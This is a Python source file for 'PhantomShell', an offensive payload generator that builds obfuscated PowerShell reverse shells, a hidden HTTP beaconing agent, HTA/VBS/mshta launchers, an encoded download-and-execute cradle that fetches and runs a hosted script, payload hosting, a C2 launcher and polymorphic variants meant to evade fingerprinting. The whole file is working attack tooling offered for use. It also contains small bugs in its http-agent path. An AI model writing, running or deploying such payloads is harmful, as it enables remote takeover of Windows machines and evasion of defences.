#!/usr/bin/python3
"""
PhantomShell v2.0 — Advanced PowerShell Payload Generator
by Red Parakeet Security Team

Generates obfuscated PowerShell reverse shells with HTTP agent support.

Usage:
    python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
    python3 phantomshell.py serve -i 10.10.10.5 -p 4444 --host-payload
"""

import base64
import sys
import argparse
import os
import random
import string
import hashlib
import time
import threading
import subprocess
import socket
from http.server import BaseHTTPRequestHandler, HTTPServer

VERSION = "2.0"

# ── Colors ──────────────────────────────────────────────────────
C = {
    "R": '\033[0m',   "r": '\033[91m', "g": '\033[92m',
    "y": '\033[93m',  "b": '\033[94m', "c": '\033[96m',
    "w": '\033[97m',  "d": '\033[2m',  "B": '\033[1m',
}

STAR = f"{C['y']}[{C['b']}*{C['y']}]{C['R']}"
OK   = f"{C['g']}[{C['w']}+{C['g']}]{C['R']}"
ERR  = f"{C['r']}[{C['y']}!{C['r']}]{C['R']}"
INFO = f"{C['c']}[{C['w']}i{C['c']}]{C['R']}"


def banner():
    print(f"""{C['r']}
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝{C['c']}
  {C['d']}PhantomShell v{VERSION} — by Red Parakeet Security Team{C['R']}
  {C['d']}https://github.com/Red-Parakeet{C['R']}
""")


# ════════════════════════════════════════════════════════════════
# CORE PAYLOAD GENERATION
# ════════════════════════════════════════════════════════════════

# ── Shell Template ──────────────────────────────────────────────
SHELL_TEMPLATE = """
$client = New-Object System.Net.Sockets.TCPClient('__IP__',__PORT__);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (IEX $data 2>&1 | Out-String);
    $sendback2 = $sendback + '__PROMPT__';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()
};
$client.Close()
"""

# ── HTTP AGENT FULL TEMPLATE ──────────────────────────────────
HTTP_AGENT_TEMPLATE = """powershell -w hidden -NoP -NonI -c "$u='http://__IP__:__PORT__';$id=[guid]::NewGuid().ToString();$pl='Windows|'+$env:COMPUTERNAME+'|'+$env:USERNAME;$sh=[System.Diagnostics.Process]@{StartInfo=[System.Diagnostics.ProcessStartInfo]@{FileName='powershell.exe';Arguments='-NoP -NonI -c -';UseShellExecute=$false;RedirectStandardInput=$true;RedirectStandardOutput=$true;RedirectStandardError=$true;CreateNoWindow=$true}};$sh.Start()|Out-Null;$si=$sh.StandardInput;$so=$sh.StandardOutput;while($true){try{$c=(iwr -UseBasicParsing ($u+'/beacon?id='+$id+'&platform='+[uri]::EscapeDataString($pl))).Content.Trim();if($c){$tok='DONE_'+[guid]::NewGuid().ToString('N').Substring(0,8);$si.WriteLine($c);$si.WriteLine('Write-Output '''+$tok+'''');$si.Flush();$lines=@();$dead=[datetime]::Now.AddSeconds(8);while([datetime]::Now -lt $dead){$l=$so.ReadLine();if($l -eq $null){break};if($l.Contains($tok)){break};$lines+=$l};$o=if($lines){$lines -join "`n"}else{'(no output)'};iwr -UseBasicParsing -Method POST -Uri ($u+'/result?id='+$id) -Body $o|Out-Null}}catch{}Start-Sleep -Seconds (3+(Get-Random -Max 2))}" """


# ── Variable Renaming ──────────────────────────────────────────
def get_var_map(profile):
    if profile == "minimal":
        return {'$client':'$c','$stream':'$st','$bytes':'$b','$data':'$d',
                '$sendback':'$sb','$sendback2':'$sb2','$sendbyte':'$sy'}
    elif profile == "random":
        used = set()
        names = {}
        chars = string.ascii_letters + string.digits
        for var in ['$client','$stream','$bytes','$data','$sendback','$sendback2','$sendbyte']:
            while True:
                name = '$' + ''.join(random.choices(chars, k=random.randint(3,6)))
                if name not in used:
                    used.add(name)
                    names[var] = name
                    break
        return names
    else:  # aggressive
        return {'$client':'$xA1','$stream':'$xB2','$bytes':'$xC3',
                '$data':'$xD4','$sendback':'$xE5','$sendback2':'$xF6','$sendbyte':'$xG7'}


def obfuscate(payload, profile):
    for old, new in sorted(get_var_map(profile).items(), key=lambda x: len(x[0]), reverse=True):
        payload = payload.replace(old, new)
    return payload


# ── Build Shell ──────────────────────────────────────────────────
def build_shell(ip, port, keep_pwd=False, hide_ip=False):
    prompt = "PS $(pwd)> " if keep_pwd else "PS> "
    if hide_ip:
        b64_ip = base64.b64encode(ip.encode()).decode()
        b64_port = base64.b64encode(str(port).encode()).decode()
        conn = f"([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{b64_ip}'))),([int][System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{b64_port}')))"
        shell = SHELL_TEMPLATE.replace("'__IP__',__PORT__", conn)
    else:
        shell = SHELL_TEMPLATE.replace("__IP__", ip).replace("__PORT__", str(port))
    return shell.replace("__PROMPT__", prompt)


# ── Encode ──────────────────────────────────────────────────────
def encode_payload(payload, layers=1):
    payload = ' '.join(payload.split())
    encoded = base64.b64encode(payload.encode('utf-16le')).decode()
    if layers >= 2:
        stage2 = f"IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded}')))"
        encoded = base64.b64encode(stage2.encode('utf-16le')).decode()
    if layers >= 3:
        stage3 = f"$_b=[System.Convert]::FromBase64String('{encoded}');$_s=[System.Text.Encoding]::Unicode.GetString($_b);IEX($_s)"
        encoded = base64.b64encode(stage3.encode('utf-16le')).decode()
    return encoded


# ── Verify ──────────────────────────────────────────────────────
def verify(payload):
    required = ['GetStream', 'Read(', 'Write(', 'Flush(', 'Close()', 'GetBytes', 'GetString']
    for token in required:
        if token not in payload:
            return False
    return True


# ── Format Output ──────────────────────────────────────────────
def format_output(encoded, fmt="powershell", hide=True):
    h = " -NoP -sta -NonI -W Hidden" if hide else ""
    if fmt == "powershell":
        return f"powershell{h} -enc {encoded}"
    elif fmt == "cmd":
        return f'cmd /c "powershell{h} -enc {encoded}"'
    elif fmt == "hta":
        return f"""<html><head><script language="VBScript">
Set o = CreateObject("WScript.Shell")
o.Run "powershell{h} -enc {encoded}", 0, False
window.close()
</script></head><body></body></html>"""
    elif fmt == "vbs":
        return f"""Set o = CreateObject("WScript.Shell")
o.Run "powershell{h} -enc {encoded}", 0, False"""
    elif fmt == "mshta":
        return f'mshta vbscript:CreateObject("WScript.Shell").Run("powershell{h} -enc {encoded}",0,False)(window.close)'
    elif fmt == "http-agent":
        return HTTP_AGENT_TEMPLATE.replace("__IP__", ip).replace("__PORT__", str(port))
    return f"powershell{h} -enc {encoded}"


# ── Generate ────────────────────────────────────────────────────
def generate(ip, port, profile="aggressive", layers=1, fmt="powershell", 
             keep_pwd=False, hide_ip=False, hide_window=True, verbose=False):
    # Special case for HTTP agent
    if fmt == "http-agent":
        return format_output(None, "http-agent", False, ip, port), "", ""
    
    raw = build_shell(ip, port, keep_pwd, hide_ip)
    obf = obfuscate(raw, profile)
    if not verify(obf):
        print(f"{ERR} Payload verification failed!")
        sys.exit(1)
    enc = encode_payload(obf, layers)
    return format_output(enc, fmt, hide_window), obf, enc


# ── Print Payload ──────────────────────────────────────────────
def print_payload(payload, port, profile, layers, fmt):
    fp = hashlib.md5(payload.encode()).hexdigest()[:8].upper()
    print(f"\n{OK} {C['g']}Payload Ready{C['R']}")
    print(f"{STAR} Profile   : {C['c']}{profile}{C['R']}")
    print(f"{STAR} Layers    : {C['y']}{layers}{C['R']}")
    print(f"{STAR} Format    : {C['c']}{fmt}{C['R']}")
    print(f"{STAR} Fingerprint: {C['c']}{fp}{C['R']}\n")
    print(f"{C['d']}{'─'*80}{C['R']}")
    print(f"{C['r']}{payload}{C['R']}")
    print(f"{C['d']}{'─'*80}{C['R']}\n")
    print(f"{STAR} {C['y']}Start C2:{C['R']} python3 phantomc2.py --port {port} --password <YOUR_PASSWORD>")


# ════════════════════════════════════════════════════════════════
# HTTP SERVER FOR PAYLOAD HOSTING
# ════════════════════════════════════════════════════════════════

class PayloadHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, content=None, filename=None, **kwargs):
        self.content = content
        self.filename = filename
        super().__init__(*args, **kwargs)
    
    def log_message(self, *args, **kwargs): pass
    
    def do_GET(self):
        if self.path == f"/{self.filename}" or self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(self.content.encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")


def start_server(host, port, content, filename):
    class Handler(PayloadHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, content=content, filename=filename, **kwargs)
    server = HTTPServer((host, port), Handler)
    print(f"{OK} Server on http://{host}:{port}/{filename}")
    server.serve_forever()


# ── Generate Download Cradle ──────────────────────────────────
def download_cradle(ip, port, filename, layers=1):
    cmd = f"$wc=New-Object System.Net.WebClient;$url='http://{ip}:{port}/{filename}';$script=$wc.DownloadString($url);IEX $script"
    enc = encode_payload(cmd, layers)
    return f"powershell -NoP -sta -NonI -W Hidden -enc {enc}"


# ── Start C2 Server ────────────────────────────────────────────
def start_c2(port, http_port, web_port, password, no_cli=False):
    if not os.path.exists("phantomc2.py"):
        print(f"{ERR} phantomc2.py not found!")
        return None
    cmd = ["python3", "phantomc2.py", "--port", str(port), 
           "--http-port", str(http_port), "--web-port", str(web_port),
           "--password", password]
    if no_cli:
        cmd.append("--no-cli")
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                           universal_newlines=True, bufsize=1)


# ════════════════════════════════════════════════════════════════
# COMMANDS
# ════════════════════════════════════════════════════════════════

def cmd_revshell(args):
    payload, _, _ = generate(args.attacker_ip, args.port, args.obf_profile, 
                             args.layers, args.format, args.keep_pwd, 
                             args.enc_b64, not args.do_not_hide, args.verbose)
    print_payload(payload, args.port, args.obf_profile, args.layers, args.format)


def cmd_serve(args):
    payload, obf, enc = generate(args.attacker_ip, args.port, args.obf_profile,
                                 args.layers, "powershell", args.keep_pwd,
                                 args.enc_b64, not args.do_not_hide, args.verbose)
    
    filename = args.filename or f"payload_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.ps1"
    if not filename.endswith('.ps1'):
        filename += '.ps1'
    
    print(f"\n{OK} {C['g']}Payload Generated{C['R']}")
    print(f"{STAR} File: {C['c']}{filename}{C['R']}")
    print(f"{STAR} Size: {C['y']}{len(obf)} bytes{C['R']}")
    
    if args.host_payload:
        port = args.host_port or 8000
        print(f"\n{STAR} Starting server on port {port}")
        t = threading.Thread(target=start_server, args=(args.host or "0.0.0.0", port, obf, filename), daemon=True)
        t.start()
        time.sleep(1)
        
        cradle = download_cradle(args.attacker_ip, port, filename, args.layers)
        print(f"\n{OK} {C['g']}Download Cradle{C['R']}")
        print(f"{C['d']}{'─'*80}{C['R']}")
        print(f"{C['r']}{cradle}{C['R']}")
        print(f"{C['d']}{'─'*80}{C['R']}")
        print(f"{STAR} URL: {C['c']}http://{args.attacker_ip}:{port}/{filename}{C['R']}")
    
    if args.start_c2:
        c2 = start_c2(args.port, args.http_port or 8081, args.web_port or 8080, 
                      args.password or "phantomshell", args.no_cli)
        if not c2:
            sys.exit(1)
        print(f"\n{STAR} C2 server started")
    
    print(f"\n{C['d']}Press Ctrl+C to stop{C['R']}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{INFO} Shutting down...")
        sys.exit(0)


def cmd_polymorph(args):
    profiles = ["minimal", "aggressive", "random"]
    print(f"{STAR} Generating {C['y']}{args.count}{C['R']} variants...\n")
    for i in range(1, args.count + 1):
        profile = profiles[(i - 1) % len(profiles)]
        payload, _, _ = generate(args.attacker_ip, args.port, profile, args.layers,
                                 "powershell", args.keep_pwd, args.enc_b64, True, args.verbose)
        fp = hashlib.md5(payload.encode()).hexdigest()[:8].upper()
        print(f"{C['c']}── Variant {i}  profile={profile}  layers={args.layers}  FP:{fp}{C['R']}")
        print(f"{C['g']}{payload}{C['R']}\n")


# ════════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(prog=f"python3 {sys.argv[0]}", description="PhantomShell Payload Generator")
    sub = parser.add_subparsers(dest="command")

    # revshell
    rev = sub.add_parser("revshell", help="Generate payload")
    rev.add_argument("-i", "--attacker-ip", required=True)
    rev.add_argument("-p", "--port", type=int, required=True)
    rev.add_argument("-o", "--obf-profile", default="aggressive", choices=["minimal", "aggressive", "random"])
    rev.add_argument("-l", "--layers", type=int, default=1, choices=[1, 2, 3])
    rev.add_argument("-f", "--format", default="powershell", 
                    choices=["powershell", "cmd", "hta", "vbs", "mshta", "http-agent"])
    rev.add_argument("--enc-b64", action="store_true")
    rev.add_argument("--keep-pwd", action="store_true")
    rev.add_argument("--do-not-hide", action="store_true")
    rev.add_argument("-v", "--verbose", action="store_true")
    rev.add_argument("--no-banner", action="store_true")

    # serve
    serve = sub.add_parser("serve", help="Generate and host payload")
    serve.add_argument("-i", "--attacker-ip", required=True)
    serve.add_argument("-p", "--port", type=int, required=True)
    serve.add_argument("--host", default="0.0.0.0")
    serve.add_argument("--host-payload", action="store_true")
    serve.add_argument("--host-port", type=int, default=8000)
    serve.add_argument("--filename", default="")
    serve.add_argument("--start-c2", action="store_true")
    serve.add_argument("--http-port", type=int, default=8081)
    serve.add_argument("--web-port", type=int, default=8080)
    serve.add_argument("--password", default="phantomshell")
    serve.add_argument("--no-cli", action="store_true")
    serve.add_argument("-o", "--obf-profile", default="aggressive", choices=["minimal", "aggressive", "random"])
    serve.add_argument("-l", "--layers", type=int, default=1, choices=[1, 2, 3])
    serve.add_argument("--enc-b64", action="store_true")
    serve.add_argument("--keep-pwd", action="store_true")
    serve.add_argument("--do-not-hide", action="store_true")
    serve.add_argument("-v", "--verbose", action="store_true")
    serve.add_argument("--no-banner", action="store_true")

    # polymorph
    poly = sub.add_parser("polymorph", help="Generate multiple variants")
    poly.add_argument("-i", "--attacker-ip", required=True)
    poly.add_argument("-p", "--port", type=int, required=True)
    poly.add_argument("-n", "--count", type=int, default=3)
    poly.add_argument("-l", "--layers", type=int, default=1, choices=[1, 2, 3])
    poly.add_argument("--enc-b64", action="store_true")
    poly.add_argument("--keep-pwd", action="store_true")
    poly.add_argument("-v", "--verbose", action="store_true")
    poly.add_argument("--no-banner", action="store_true")

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(1)
    if not getattr(args, "no_banner", False):
        banner()
    
    if args.command == "revshell":
        cmd_revshell(args)
    elif args.command == "serve":
        cmd_serve(args)
    elif args.command == "polymorph":
        cmd_polymorph(args)


if __name__ == "__main__":
    main()
